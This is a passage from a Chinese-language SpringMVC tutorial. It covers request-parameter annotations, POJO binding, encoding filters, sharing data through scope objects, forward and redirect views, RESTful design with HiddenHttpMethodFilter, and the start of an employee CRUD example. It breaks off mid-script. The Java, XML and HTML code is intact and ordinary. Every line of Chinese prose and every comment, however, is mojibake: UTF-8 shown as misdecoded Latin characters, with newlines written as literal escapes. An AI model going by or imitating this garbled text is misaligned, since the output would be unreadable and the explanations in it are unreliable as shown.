è¾“valueæ‰€æŒ‡å®šçš„è¯·æ±‚å‚æ•°ï¼Œè‹¥æ²¡æœ‰ä¼ è¾“ï¼Œåˆ™æ³¨è§£æ‰€æ ‡è¯†çš„å½¢å‚çš„å€¼ä¸ºnull\n\n- defaultValueï¼šä¸ç®¡requiredå±æ€§å€¼ä¸ºtrueæˆ–falseï¼Œå½“valueæ‰€æŒ‡å®šçš„è¯·æ±‚å‚æ•°æ²¡æœ‰ä¼ è¾“æˆ–ä¼ è¾“çš„å€¼ä¸º\"\"æ—¶ï¼Œåˆ™ä½¿ç”¨é»˜è®¤å€¼ä¸ºå½¢å‚èµ‹å€¼\n\næµ‹è¯•ï¼šæ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚å’Œè¯·æ±‚å‚æ•°åŒå\n\n```java\n<a th:href=\"@{/testParam(username='admin')}\">æµ‹è¯•</a>\n\n@RequestMapping(\"/testParam\")\npublic String testParam(String username){\n\tSystem.out.println(\"username:\"+username);\n  return \"success\";\n}\n\n//username:admin\n```\n\næµ‹è¯•ï¼šæ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚å’Œè¯·æ±‚å‚æ•°ä¸åŒå\n\n```java\n<a th:href=\"@{/testParam(user_name='admin')}\">æµ‹è¯•</a>\n\n@RequestMapping(\"/testParam\")\npublic String testParam(String username){\n    System.out.println(\"username:\"+username);\n    return \"success\";\n}\n\n//username:null\n```\n\næµ‹è¯•ï¼šæ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚å’Œè¯·æ±‚å‚æ•°ä¸åŒåï¼Œä½†æ·»åŠ @RequestParamæ³¨è§£\n\n```java\n<a th:href=\"@{/testParam(user_name='admin')}\">æµ‹è¯•</a>\n\n@RequestMapping(\"/testParam\")\npublic String testParam(@RequestParam(\"user_name\") String username){\n    System.out.println(\"username:\"+username);\n    return \"success\";\n}\n\n//username:admin\n```\n\næµ‹è¯•ï¼šrequiredå’ŒdefaultValueå±æ€§\n\n```java\n<a th:href=\"@{/testParam(user_name)}\">æµ‹è¯•</a>\n\n@RequestMapping(\"/testParam\")\npublic String testParam(@RequestParam(value = \"user_name\",required = false,defaultValue = \"root\" ) String username){\n  System.out.println(\"username:\"+username);\n  return \"success\";\n}\n\n//username:root\n```\n\n### 4ã€@RequestHeader\n\n- @RequestHeaderæ˜¯å°†**è¯·æ±‚å¤´ä¿¡æ¯**å’Œ**æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚**åˆ›å»ºæ˜ å°„å…³ç³»\n\n- @RequestHeaderæ³¨è§£ä¸€å…±æœ‰ä¸‰ä¸ªå±æ€§ï¼švalueã€requiredã€defaultValue\n\n- ç”¨æ³•åŒ@RequestParam\n\n```java\n<a th:href=\"@{/testParam(user_name)}\">æµ‹è¯•</a>\n\n@RequestMapping(\"/testParam\")\npublic String testParam(\n  @RequestParam(value = \"user_name\", required = false, defaultValue = \"root\") String username,\n  String password,\n  String hobby,\n  @RequestHeader(\"host\") String host){\n  System.out.println(\"username:\" + username);\n  System.out.println(\"host = \" + host);\n  return \"success\";\n}\n```\n\n### 5ã€@CookieValue\n\n- @CookieValueæ˜¯å°†**cookieæ•°æ®**å’Œ**æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚**åˆ›å»ºæ˜ å°„å…³ç³»\n\n- @CookieValueæ³¨è§£ä¸€å…±æœ‰ä¸‰ä¸ªå±æ€§ï¼švalueã€requiredã€defaultValue\n- ç”¨æ³•åŒ@RequestParam\n\n### 6ã€é€šè¿‡POJOè·å–è¯·æ±‚å‚æ•°\n\nå¯ä»¥åœ¨æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚ä½ç½®è®¾ç½®ä¸€ä¸ª**å®ä½“ç±»ç±»å‹çš„å½¢å‚**ï¼Œæ­¤æ—¶è‹¥æµè§ˆå™¨ä¼ è¾“çš„è¯·æ±‚å‚æ•°çš„å‚æ•°åå’Œå®ä½“ç±»ä¸­çš„å±æ€§åä¸€è‡´ï¼Œé‚£ä¹ˆè¯·æ±‚å‚æ•°å°±ä¼šä¸ºæ­¤å±æ€§èµ‹å€¼\n\n```html\n<form th:action=\"@{/testpojo}\" method=\"post\">\n    ç”¨æˆ·åï¼š<input type=\"text\" name=\"username\"><br>\n    å¯†ç ï¼š<input type=\"password\" name=\"password\"><br>\n    æ€§åˆ«ï¼š<input type=\"radio\" name=\"sex\" value=\"ç”·\">ç”·<input type=\"radio\" name=\"sex\" value=\"å¥³\">å¥³<br>\n    å¹´é¾„ï¼š<input type=\"text\" name=\"age\"><br>\n    é‚®ç®±ï¼š<input type=\"text\" name=\"email\"><br>\n    <input type=\"submit\">\n</form>\n```\n```java\npublic class User {\n\n    private Integer id;\n    private String username;\n    private String password;\n    private String sex;\n    private Integer age;\n    private String email;\n\n    public User(Integer id, String username, String password, String sex, Integer age, String email) {\n        this.id = id;\n        this.username = username;\n        this.password = password;\n        this.sex = sex;\n        this.age = age;\n        this.email = email;\n    }\n\n    public Integer getId() {\n        return id;\n    }\n\n    public void setId(Integer id) {\n        this.id = id;\n    }\n\n    public String getUsername() {\n        return username;\n    }\n\n    public void setUsername(String username) {\n        this.username = username;\n    }\n\n    public String getPassword() {\n        return password;\n    }\n\n    public void setPassword(String password) {\n        this.password = password;\n    }\n\n    public String getSex() {\n        return sex;\n    }\n\n    public void setSex(String sex) {\n        this.sex = sex;\n    }\n\n    public Integer getAge() {\n        return age;\n    }\n\n    public void setAge(Integer age) {\n        this.age = age;\n    }\n\n    public String getEmail() {\n        return email;\n    }\n\n    public void setEmail(String email) {\n        this.email = email;\n    }\n\n    @Override\n    public String toString() {\n        return \"User{\" +\n                \"id=\" + id +\n                \", username='\" + username + '\\'' +\n                \", password='\" + password + '\\'' +\n                \", sex='\" + sex + '\\'' +\n                \", age=\" + age +\n                \", email='\" + email + '\\'' +\n                '}';\n    }\n}\n```\n\n```java\n@RequestMapping(\"/testpojo\")\npublic String testPOJO(User user){//ä¼ å…¥å®ä½“ç±»å½¢å‚\n    System.out.println(user);\n    return \"success\";\n}\n//æœ€ç»ˆç»“æœ-->User{id=null, username='å¼ ä¸‰', password='123', age=23, sex='ç”·', email='123@qq.com'}\n```\n\n### 7ã€è§£å†³è·å–è¯·æ±‚å‚æ•°çš„ä¹±ç é—®é¢˜\n\nè§£å†³è·å–è¯·æ±‚å‚æ•°çš„ä¹±ç é—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨SpringMVCæä¾›çš„ç¼–ç è¿‡æ»¤å™¨CharacterEncodingFilterï¼Œåœ¨web.xmlä¸­è¿›è¡Œæ³¨å†Œ\n\n```xml\n<!--é…ç½®springMVCçš„ç¼–ç è¿‡æ»¤å™¨-->\n<filter>\n    <filter-name>CharacterEncodingFilter</filter-name>\n    <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>\n    <init-param>\n        <param-name>encoding</param-name>\n        <param-value>UTF-8</param-value>\n    </init-param>\n    <init-param>\n        <param-name>forceResponseEncoding</param-name>\n        <param-value>true</param-value>\n    </init-param>\n</filter>\n<filter-mapping>\n    <filter-name>CharacterEncodingFilter</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n```\n\næ³¨ï¼šSpringMVCä¸­å¤„ç†ç¼–ç çš„è¿‡æ»¤å™¨ä¸€å®šè¦é…ç½®åˆ°å…¶ä»–è¿‡æ»¤å™¨ä¹‹å‰ï¼Œå¦åˆ™æ— æ•ˆ\n\n## äº”ã€åŸŸå¯¹è±¡å…±äº«æ•°æ®\n\n### 1ã€ä½¿ç”¨ServletAPIå‘requeståŸŸå¯¹è±¡å…±äº«æ•°æ®\n\n```java\n@RequestMapping(\"/testServletAPI\")\npublic String testServletAPI(HttpServletRequest request){\n    request.setAttribute(\"testScope\", \"hello,servletAPI\");\n    return \"success\";\n}\n```\n\n### 2ã€ä½¿ç”¨ModelAndViewå‘requeståŸŸå¯¹è±¡å…±äº«æ•°æ®\n\n```java\n@RequestMapping(\"/testModelAndView\")\npublic ModelAndView testModelAndView(){\n    /**\n     * ModelAndViewæœ‰Modelå’ŒViewçš„åŠŸèƒ½\n     * Modelä¸»è¦ç”¨äºå‘è¯·æ±‚åŸŸå…±äº«æ•°æ®\n     * Viewä¸»è¦ç”¨äºè®¾ç½®è§†å›¾ï¼Œå®ç°é¡µé¢è·³è½¬\n     */\n    ModelAndView mav = new ModelAndView();\n    //å‘è¯·æ±‚åŸŸå…±äº«æ•°æ®\n    mav.addObject(\"testScope\", \"hello,ModelAndView\");\n    //è®¾ç½®è§†å›¾ï¼Œå®ç°é¡µé¢è·³è½¬\n    mav.setViewName(\"success\");\n    return mav;\n}\n```\n\n### 3ã€ä½¿ç”¨Modelå‘requeståŸŸå¯¹è±¡å…±äº«æ•°æ®\n\n```java\n@RequestMapping(\"/testModel\")\npublic String testModel(Model model){\n    model.addAttribute(\"testScope\", \"hello,Model\");\n    return \"success\";\n}\n```\n\n### 4ã€ä½¿ç”¨mapå‘requeståŸŸå¯¹è±¡å…±äº«æ•°æ®\n\n```java\n@RequestMapping(\"/testMap\")\npublic String testMap(Map<String, Object> map){\n    map.put(\"testScope\", \"hello,Map\");\n    return \"success\";\n}\n```\n\n### 5ã€ä½¿ç”¨ModelMapå‘requeståŸŸå¯¹è±¡å…±äº«æ•°æ®\n\n```java\n@RequestMapping(\"/testModelMap\")\npublic String testModelMap(ModelMap modelMap){\n    modelMap.addAttribute(\"testScope\", \"hello,ModelMap\");\n    return \"success\";\n}\n```\n\n### 6ã€Modelã€ModelMapã€Mapçš„å…³ç³»\n\nModelã€ModelMapã€Mapç±»å‹çš„å‚æ•°å…¶å®æœ¬è´¨ä¸Šéƒ½æ˜¯ BindingAwareModelMap ç±»å‹çš„\n\n```\npublic interface Model{}\npublic class ModelMap extends LinkedHashMap<String, Object> {}\npublic class ExtendedModelMap extends ModelMap implements Model {}\npublic class BindingAwareModelMap extends ExtendedModelMap {}\n```\n\n### 7ã€å‘sessionåŸŸå…±äº«æ•°æ®\n\n```java\n@RequestMapping(\"/testSession\")\npublic String testSession(HttpSession session){\n    session.setAttribute(\"testSessionScope\", \"hello,session\");\n    return \"success\";\n}\n```\n\n### 8ã€å‘applicationåŸŸå…±äº«æ•°æ®\n\n```java\n@RequestMapping(\"/testApplication\")\npublic String testApplication(HttpSession session){\n\tServletContext application = session.getServletContext();\n    application.setAttribute(\"testApplicationScope\", \"hello,application\");\n    return \"success\";\n}\n```\n\n## å…­ã€SpringMVCçš„è§†å›¾\n\nSpringMVCä¸­çš„è§†å›¾æ˜¯Viewæ¥å£ï¼Œè§†å›¾çš„ä½œç”¨æ¸²æŸ“æ•°æ®ï¼Œå°†æ¨¡å‹Modelä¸­çš„æ•°æ®å±•ç¤ºç»™ç”¨æˆ·\n\nSpringMVCè§†å›¾çš„ç§ç±»å¾ˆå¤šï¼Œé»˜è®¤æœ‰è½¬å‘è§†å›¾å’Œé‡å®šå‘è§†å›¾ã€‚è‹¥ä½¿ç”¨çš„è§†å›¾æŠ€æœ¯ä¸ºThymeleafï¼Œåœ¨SpringMVCçš„é…ç½®æ–‡ä»¶ä¸­é…ç½®äº†Thymeleafçš„è§†å›¾è§£æå™¨ï¼Œç”±æ­¤è§†å›¾è§£æå™¨è§£æä¹‹åæ‰€å¾—åˆ°çš„æ˜¯ThymeleafView\n\n### 1ã€ThymeleafView\n\nå½“æ§åˆ¶å™¨æ–¹æ³•ä¸­æ‰€è®¾ç½®çš„è§†å›¾åç§°æ²¡æœ‰ä»»ä½•å‰ç¼€æ—¶ï¼Œæ­¤æ—¶çš„è§†å›¾åç§°ä¼šè¢«SpringMVCé…ç½®æ–‡ä»¶ä¸­æ‰€é…ç½®çš„è§†å›¾è§£æå™¨è§£æï¼Œè§†å›¾åç§°æ‹¼æ¥è§†å›¾å‰ç¼€å’Œè§†å›¾åç¼€æ‰€å¾—åˆ°çš„æœ€ç»ˆè·¯å¾„ï¼Œä¼šé€šè¿‡è½¬å‘çš„æ–¹å¼å®ç°è·³è½¬\n\n```java\n@RequestMapping(\"/testHello\")\npublic String testHello(){\n    return \"hello\";\n}\n```\n\n### 2ã€è½¬å‘è§†å›¾\n\nSpringMVCä¸­é»˜è®¤çš„è½¬å‘è§†å›¾æ˜¯InternalResourceView\n\nå½“æ§åˆ¶å™¨æ–¹æ³•ä¸­æ‰€è®¾ç½®çš„è§†å›¾åç§°ä»¥\"**forward:**\"ä¸ºå‰ç¼€æ—¶ï¼Œåˆ›å»ºInternalResourceViewè§†å›¾ï¼Œæ­¤æ—¶çš„è§†å›¾åç§°ä¸ä¼šè¢«SpringMVCé…ç½®æ–‡ä»¶ä¸­æ‰€é…ç½®çš„è§†å›¾è§£æå™¨è§£æï¼Œè€Œæ˜¯ä¼šå°†å‰ç¼€\"forward:\"å»æ‰ï¼Œå‰©ä½™éƒ¨åˆ†ä½œä¸ºæœ€ç»ˆè·¯å¾„é€šè¿‡è½¬å‘çš„æ–¹å¼å®ç°è·³è½¬\n\n```java\n@RequestMapping(\"/testForward\")\npublic String testForward(){\n    return \"forward:/testHello\";\n}\n```\n\n### 3ã€é‡å®šå‘è§†å›¾\n\nSpringMVCä¸­é»˜è®¤çš„é‡å®šå‘è§†å›¾æ˜¯RedirectView\n\nå½“æ§åˆ¶å™¨æ–¹æ³•ä¸­æ‰€è®¾ç½®çš„è§†å›¾åç§°ä»¥\"**redirect:**\"ä¸ºå‰ç¼€æ—¶ï¼Œåˆ›å»ºRedirectViewè§†å›¾ï¼Œæ­¤æ—¶çš„è§†å›¾åç§°ä¸ä¼šè¢«SpringMVCé…ç½®æ–‡ä»¶ä¸­æ‰€é…ç½®çš„è§†å›¾è§£æå™¨è§£æï¼Œè€Œæ˜¯ä¼šå°†å‰ç¼€\"redirect:\"å»æ‰ï¼Œå‰©ä½™éƒ¨åˆ†ä½œä¸ºæœ€ç»ˆè·¯å¾„é€šè¿‡é‡å®šå‘çš„æ–¹å¼å®ç°è·³è½¬\n\n```java\n@RequestMapping(\"/testRedirect\")\npublic String testRedirect(){\n    return \"redirect:/testHello\";\n}\n```\n\næ³¨ï¼šé‡å®šå‘è§†å›¾åœ¨è§£ææ—¶ï¼Œä¼šå…ˆå°†redirect:å‰ç¼€å»æ‰ï¼Œç„¶åä¼šåˆ¤æ–­å‰©ä½™éƒ¨åˆ†æ˜¯å¦ä»¥/å¼€å¤´ï¼Œè‹¥æ˜¯åˆ™ä¼šè‡ªåŠ¨æ‹¼æ¥ä¸Šä¸‹æ–‡è·¯å¾„\n\n### 4ã€è§†å›¾æ§åˆ¶å™¨view-controller\n\nå¦‚æœå‘é€çš„è¯·æ±‚ä¸æƒ³é€šè¿‡controllerï¼Œåªæƒ³ç›´æ¥åœ°è·³è½¬åˆ°ç›®æ ‡é¡µé¢ï¼Œè¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨mvc:view-controlleræ ‡ç­¾ï¼Œåœ¨SpringMVC.xmlé…ç½®æ–‡ä»¶ä¸­é…ç½®:\n\n```xml\n<!--pathï¼šè®¾ç½®å¤„ç†çš„è¯·æ±‚åœ°å€ view-nameï¼šè®¾ç½®è¯·æ±‚åœ°å€æ‰€å¯¹åº”çš„è§†å›¾åç§°-->\n<mvc:view-controller path=\"/testView\" view-name=\"success\"></mvc:view-controller>\n```\n\nç­‰åŒäºå¦‚ä¸‹ä»£ç \n\n```Java\n@RequestMapping(value=\"/testView\")\npublic String hello(){\n    return \"success\";\n}\n```\n\næ³¨ï¼š\n\n- ä½¿ç”¨äº†è¿™ä¸ªæ ‡ç­¾åå¿…é¡»å¼€å¯mvcæ³¨è§£é©±åŠ¨çš„æ ‡ç­¾ `<mvc:annotation-driven />`ï¼Œå¦åˆ™ä¼šé€ æˆæ‰€æœ‰çš„@Controlleræ³¨è§£æ— æ³•è§£æï¼Œå¯¼è‡´404é”™è¯¯ã€‚\n- å¦‚æœè¯·æ±‚å­˜åœ¨å¤„ç†å™¨ï¼Œåˆ™è¿™ä¸ªæ ‡ç­¾å¯¹åº”çš„è¯·æ±‚å¤„ç†å°†ä¸èµ·ä½œç”¨ã€‚å› ä¸ºè¯·æ±‚æ˜¯å…ˆå»æ‰¾å¤„ç†å™¨å¤„ç†ï¼Œå¦‚æœæ‰¾ä¸åˆ°æ‰ä¼šå»æ‰¾è¿™ä¸ªæ ‡ç­¾é…ç½®ã€‚\n\n## ä¸ƒã€RESTful\n\n### 1ã€RESTfulç®€ä»‹\n\nRESTï¼š**Re**presentational **S**tate **T**ransferï¼Œè¡¨ç°å±‚èµ„æºçŠ¶æ€è½¬ç§»ã€‚\n\nçŠ¶æ€è½¬ç§»ï¼šåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ä¹‹é—´è½¬ç§»ä»£è¡¨èµ„æºçŠ¶æ€çš„è¡¨è¿°ã€‚é€šè¿‡è½¬ç§»å’Œæ“ä½œèµ„æºçš„è¡¨è¿°ï¼Œæ¥é—´æ¥å®ç°æ“ä½œèµ„æºçš„ç›®çš„ã€‚\n\n### 2ã€RESTfulçš„å®ç°\n\nå…·ä½“è¯´ï¼Œå°±æ˜¯ HTTP åè®®é‡Œé¢ï¼Œå››ä¸ªè¡¨ç¤ºæ“ä½œæ–¹å¼çš„åŠ¨è¯ï¼šGETã€POSTã€PUTã€DELETEã€‚\n\nå®ƒä»¬åˆ†åˆ«å¯¹åº”å››ç§åŸºæœ¬æ“ä½œï¼šGET ç”¨æ¥è·å–èµ„æºï¼ŒPOST ç”¨æ¥æ–°å»ºèµ„æºï¼ŒPUT ç”¨æ¥æ›´æ–°èµ„æºï¼ŒDELETE ç”¨æ¥åˆ é™¤èµ„æºã€‚\n\nREST é£æ ¼æå€¡ URL åœ°å€ä½¿ç”¨ç»Ÿä¸€çš„é£æ ¼è®¾è®¡ï¼Œä»å‰åˆ°åå„ä¸ªå•è¯**ä½¿ç”¨æ–œæ åˆ†å¼€**ï¼Œ**ä¸ä½¿ç”¨é—®å·é”®å€¼å¯¹æ–¹å¼**æºå¸¦è¯·æ±‚å‚æ•°ï¼Œè€Œæ˜¯å°†è¦å‘é€ç»™æœåŠ¡å™¨çš„æ•°æ®ä½œä¸º URL åœ°å€çš„ä¸€éƒ¨åˆ†ï¼Œä»¥ä¿è¯æ•´ä½“é£æ ¼çš„ä¸€è‡´æ€§ã€‚\n\n| æ“ä½œ     | ä¼ ç»Ÿæ–¹å¼         | RESTé£æ ¼ | è¯·æ±‚æ–¹å¼       |\n| -------- | ---------------- | -------- | -------------- |\n| æŸ¥è¯¢æ“ä½œ | getUserById?id=1 | user/1   | getè¯·æ±‚æ–¹å¼    |\n| ä¿å­˜æ“ä½œ | saveUser         | user     | postè¯·æ±‚æ–¹å¼   |\n| åˆ é™¤æ“ä½œ | deleteUser?id=1  | user/1   | deleteè¯·æ±‚æ–¹å¼ |\n| æ›´æ–°æ“ä½œ | updateUser       | user     | putè¯·æ±‚æ–¹å¼    |\n\n### 3ã€HiddenHttpMethodFilter\n\nç”±äºæµè§ˆå™¨åªæ”¯æŒå‘é€getå’Œpostæ–¹å¼çš„è¯·æ±‚ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•å‘é€putå’Œdeleteè¯·æ±‚å‘¢ï¼Ÿ\n\nSpringMVC æä¾›äº† **HiddenHttpMethodFilter** å¸®åŠ©æˆ‘ä»¬**å°† POST è¯·æ±‚è½¬æ¢ä¸º DELETE æˆ– PUT è¯·æ±‚**\n\n**HiddenHttpMethodFilter** å¤„ç†putå’Œdeleteè¯·æ±‚çš„æ¡ä»¶ï¼š\n\n- a>å½“å‰è¯·æ±‚çš„è¯·æ±‚æ–¹å¼å¿…é¡»ä¸ºpost\n- b>å½“å‰è¯·æ±‚å¿…é¡»ä¼ è¾“è¯·æ±‚å‚æ•°_method\n\n```html\n<!-- ä½œç”¨ï¼šé€šè¿‡è¶…é“¾æ¥æ§åˆ¶è¡¨å•çš„æäº¤ï¼Œå°†postè¯·æ±‚è½¬æ¢ä¸ºdeleteè¯·æ±‚ -->\n<form id=\"delete_form\" method=\"post\">\n  <input type=\"hidden\" name=\"_method\" value=\"delete\"/>\n</form>\n```\n\næ»¡è¶³ä»¥ä¸Šæ¡ä»¶ï¼Œ**HiddenHttpMethodFilter** è¿‡æ»¤å™¨å°±ä¼šå°†å½“å‰è¯·æ±‚çš„è¯·æ±‚æ–¹å¼è½¬æ¢ä¸ºè¯·æ±‚å‚æ•°_methodçš„å€¼ï¼Œå› æ­¤è¯·æ±‚å‚æ•°\\_methodçš„å€¼æ‰æ˜¯æœ€ç»ˆçš„è¯·æ±‚æ–¹å¼\n\nåœ¨web.xmlä¸­æ³¨å†Œ**HiddenHttpMethodFilter** \n\n```xml\n<filter>\n    <filter-name>HiddenHttpMethodFilter</filter-name>\n    <filter-class>org.springframework.web.filter.HiddenHttpMethodFilter</filter-class>\n</filter>\n<filter-mapping>\n    <filter-name>HiddenHttpMethodFilter</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n```\n\næ³¨ï¼šç›®å‰ä¸ºæ­¢ï¼ŒSpringMVCä¸­æä¾›äº†ä¸¤ä¸ªè¿‡æ»¤å™¨ï¼šCharacterEncodingFilterå’ŒHiddenHttpMethodFilter\n\nåœ¨web.xmlä¸­æ³¨å†Œæ—¶ï¼Œå¿…é¡»å…ˆæ³¨å†ŒCharacterEncodingFilterï¼Œå†æ³¨å†ŒHiddenHttpMethodFilter\n\nåŸå› ï¼š\n\n-  åœ¨ CharacterEncodingFilter ä¸­é€šè¿‡ request.setCharacterEncoding(encoding) æ–¹æ³•è®¾ç½®å­—ç¬¦é›†ï¼Œè¯¥æ–¹æ³•è¦æ±‚å‰é¢ä¸èƒ½æœ‰ä»»ä½•è·å–è¯·æ±‚å‚æ•°çš„æ“ä½œ\n\n- è€Œ HiddenHttpMethodFilter æ°æ°æœ‰ä¸€ä¸ªè·å–è¯·æ±‚æ–¹å¼çš„æ“ä½œï¼š`String paramValue = request.getParameter(this.methodParam);`\n\n### 4ã€RESTfulæ¡ˆä¾‹\n\n#### 1ã€æ¡ˆä¾‹æè¿°\n\nå®ç°å¯¹å‘˜å·¥ä¿¡æ¯çš„å¢åˆ æ”¹æŸ¥ï¼ŒåŠŸèƒ½æ¸…å•å¦‚ä¸‹\n\n| åŠŸèƒ½                 | URL åœ°å€    | è¯·æ±‚æ–¹å¼ |\n| -------------------- | ----------- | -------- |\n| 1.è®¿é—®é¦–é¡µ           | /           | GET      |\n| 2.æŸ¥è¯¢å…¨éƒ¨æ•°æ®       | /employee   | GET      |\n| 3.åˆ é™¤æ•°æ®           | /employee/2 | DELETE   |\n| 4.è·³è½¬åˆ°æ·»åŠ æ•°æ®é¡µé¢ | /toAdd      | GET      |\n| 5.ä¿å­˜æ•°æ®           | /employee   | POST     |\n| 6.è·³è½¬åˆ°æ›´æ–°æ•°æ®é¡µé¢ | /employee/2 | GET      |\n| 7.æ›´æ–°æ•°æ®           | /employee   | PUT      |\n\n#### 2ã€å‡†å¤‡å·¥ä½œ\n\n- åˆ›å»ºé¡¹ç›®\n\nå‚è€ƒç¬¬äºŒç« å¿«é€Ÿå…¥é—¨\n\n- å‡†å¤‡å®ä½“ç±»\n\n```java\npackage com.example.mvc.bean;\n\npublic class Employee {\n\n    private Integer id;\n    private String lastName;\n    private String email;\n    private Integer gender; //1 male, 0 female\n\n    public Employee(Integer id, String lastName, String email, Integer gender) {\n        super();\n        this.id = id;\n        this.lastName = lastName;\n        this.email = email;\n        this.gender = gender;\n    }\n\n    public Employee() {\n    }\n  \n    public Integer getId() {\n        return id;\n    }\n    public void setId(Integer id) {\n        this.id = id;\n    }\n    public String getLastName() {\n        return lastName;\n    }\n    public void setLastName(String lastName) {\n        this.lastName = lastName;\n    }\n    public String getEmail() {\n        return email;\n    }\n    public void setEmail(String email) {\n        this.email = email;\n    }\n    public Integer getGender() {\n        return gender;\n    }\n    public void setGender(Integer gender) {\n        this.gender = gender;\n    }\n}\n```\n\n- å‡†å¤‡daoæ¨¡æ‹Ÿæ•°æ®\n\n```java\npackage com.example.mvc.dao;\n\nimport com.example.mvc.bean.Employee;\nimport org.springframework.stereotype.Repository;\n\nimport java.util.Collection;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@Repository\npublic class EmployeeDao {\n\n    private static Map<Integer, Employee> employees = null;\n\n    static{\n        employees = new HashMap<Integer, Employee>();\n\n        employees.put(1001, new Employee(1001, \"E-AA\", \"aa@163.com\", 1));\n        employees.put(1002, new Employee(1002, \"E-BB\", \"bb@163.com\", 1));\n        employees.put(1003, new Employee(1003, \"E-CC\", \"cc@163.com\", 0));\n        employees.put(1004, new Employee(1004, \"E-DD\", \"dd@163.com\", 0));\n        employees.put(1005, new Employee(1005, \"E-EE\", \"ee@163.com\", 1));\n    }\n\n    private static Integer initId = 1006;\n\n    public void save(Employee employee){//ä¿å­˜å‘˜å·¥ä¿¡æ¯\n        if(employee.getId() == null){\n            employee.setId(initId++);//idè‡ªå¢\n        }\n        employees.put(employee.getId(), employee);\n    }\n\n    public Collection<Employee> getAll(){//è·å–æ‰€æœ‰å‘˜å·¥ä¿¡æ¯\n        return employees.values();\n    }\n\n    public Employee get(Integer id){//é€šè¿‡idè·å–å‘˜å·¥ä¿¡æ¯\n        return employees.get(id);\n    }\n\n    public void delete(Integer id){//é€šè¿‡idåˆ é™¤å‘˜å·¥ä¿¡æ¯\n        employees.remove(id);\n    }\n}\n```\n\n#### 3ã€åŠŸèƒ½1ï¼šè®¿é—®é¦–é¡µ\n\n- 1>é…ç½®è§†å›¾æ§åˆ¶å™¨ view-controller\n\n```xml\n<!--è§†å›¾æ§åˆ¶å™¨-->\n<mvc:view-controller path=\"/\" view-name=\"index\"/>\n<!--å¼€å¯mvcæ³¨è§£é©±åŠ¨-->\n<mvc:annotation-driven />\n```\n\n- 2>åˆ›å»ºindexé¡µé¢\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\" >\n    <title>Title</title>\n</head>\n<body>\n<h1>é¦–é¡µ</h1>\n<a th:href=\"@{/employee}\">è®¿é—®å‘˜å·¥ä¿¡æ¯</a>\n</body>\n</html>\n```\n\n#### 4ã€åŠŸèƒ½2ï¼šæŸ¥è¯¢å…¨éƒ¨æ•°æ®\n\n- 1>æ§åˆ¶å™¨æ–¹æ³•ï¼šè·³è½¬åˆ°å‘˜å·¥æ•°æ®é¡µé¢ï¼Œå¹¶å°†è·å–åˆ°çš„å‘˜å·¥æ•°æ®çš„æ•°æ®å­˜åˆ°åŸŸä¸­ï¼Œä»¥ä¾¿åœ¨é¡µé¢ä¸­æ˜¾ç¤º\n\n```java\npackage com.example.mvc.controller;\n\n@Controller\npublic class EmployeeController {\n    @Autowired\n    private EmployeeDao employeeDao;\n  \n    @RequestMapping(value = \"/employee\", method = RequestMethod.GET)\n    public String getEmployeeList(Model model){\n    Collection<Employee> employeeList = employeeDao.getAll();\n    model.addAttribute(\"employeeList\", employeeList);\n    return \"employee_list\";\n}\n\n```\n\n- 2>>åˆ›å»ºå‘˜å·¥ä¿¡æ¯æ˜¾ç¤ºé¡µé¢employee_list.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Employee Info</title>\n</head>\n<body>\n\n    <table id=\"dataTable\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"text-align: center;\" >\n        <tr>\n            <th colspan=\"5\">Employee Info</th>\n        </tr>\n        <tr>\n            <th>id</th>\n            <th>lastName</th>\n            <th>email</th>\n            <th>gender</th>\n            <th>options</th>\n        </tr>\n        <tr th:each=\"employee : ${employeeList}\">\n            <td th:text=\"${employee.id}\"></td>\n            <td th:text=\"${employee.lastName}\"></td>\n            <td th:text=\"${employee.email}\"></td>\n            <td th:text=\"${employee.gender}\"></td>\n            <td></td>\n        </tr>\n    </table>\n</body>\n</html>\n```\n\n#### 5ã€åŠŸèƒ½3ï¼šåˆ é™¤æ•°æ®\n\n- 1>åˆ›å»ºå¤„ç†deleteè¯·æ±‚æ–¹å¼çš„è¡¨å•\n\n```html\n<!-- ä½œç”¨ï¼šé€šè¿‡è¶…é“¾æ¥æ§åˆ¶è¡¨å•çš„æäº¤ï¼Œå°†postè¯·æ±‚è½¬æ¢ä¸ºdeleteè¯·æ±‚ -->\n<form id=\"delete_form\" method=\"post\">\n<!--HiddenHttpMethodFilterè¦æ±‚ï¼šå¿…é¡»ä¼ è¾“_methodè¯·æ±‚å‚æ•°ï¼Œå€¼ä¸ºæœ€ç»ˆçš„è¯·æ±‚æ–¹å¼-->\n    <input type=\"hidden\" name=\"_method\" value=\"delete\"/>\n</form>\n```\n\n- 2>åœ¨é¡µé¢ä¸­å¢åŠ åˆ é™¤æ“ä½œçš„è¶…é“¾æ¥ï¼Œå¹¶ç»‘å®šç»‘å®šç‚¹å‡»äº‹ä»¶\n\n```html\n<!--hrefå†™æ³•1-->\n<a @click=\"deleteEmployee\" th:href=\"@{'/employee/'+${employee.id}}\">delete</a>\n\n<!--hrefå†™æ³•2-->\n<a @click=\"deleteEmployee\" th:href=\"@{/employee/}+${employee.id}\">delete</a>\n```\n\n- 3>é€šè¿‡vueå¤„ç†ç‚¹å‡»äº‹ä»¶\n\n```html\n<!--å¼•å…¥vue.js-->\n<script type=\"text/javascript\" th:src=\"@{/static/js/vue.js}\"></script>\n<script type=\"text/javascript\">\n    var vue = new Vue({\n        el:\"#dataTable\",\n        methods:{\n            //eventè¡¨ç¤ºå½“å‰äº‹ä»¶\n            deleteEmployee:function (event) {\n                